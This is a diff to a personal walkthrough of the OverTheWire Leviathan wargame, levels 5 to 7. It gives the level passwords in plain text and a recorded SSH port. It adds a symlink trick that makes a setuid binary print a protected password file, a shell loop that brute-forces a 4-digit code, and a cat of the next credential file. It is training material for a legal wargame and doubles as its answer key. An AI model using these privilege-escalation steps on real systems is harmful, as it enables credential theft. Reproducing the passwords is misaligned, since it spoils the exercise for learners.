@@ -175,7 +175,37 @@ ssh leviathan4@bandit.labs.overthewire.org -p 2223
 leviathan5 Level 5 → Level 6
 ssh leviathan5@bandit.labs.overthewire.org -p 2223 
   password: Tith4cokei
-leviathan6 Level 6 → Level 7
 
- 
+1. ls 
+    -r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
+
+2. ./leviathan5
+     Cannot find /tmp/file.log
+
+3.   
+     ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+   # make the file /tmp/file.log a symbolic link to /etc/leviathan_pass/leviathan6
+
+4. /leviathan5
+    output:
+      UgaoFee4li
+
+
+leviathan6 Level 6 → Level 7
+ssh leviathan6@bandit.labs.overthewire.org -p 2223 
+  password:UgaoFee4li
+
+1. ls -lah
+   -r-sr-x---  1 leviathan7 leviathan6 7.3K Aug 26  2019 leviathan6
+2 ./leviathan6 
+     output:
+    usage: ./leviathan6 <4 digit code>
+3. for i in $(seq 0000 9999); do ./leviathan6 $i ; done # bruteforce the  4 digit code
+4. The above code is stop when digit code is 7122 and we are log in as leviathan7
+     we can check using command whoami.
+5.cat /etc/leviathan_pass/leviathan7
+ output:
+ ahy7MaeBo9
+
+END OF GAME
   
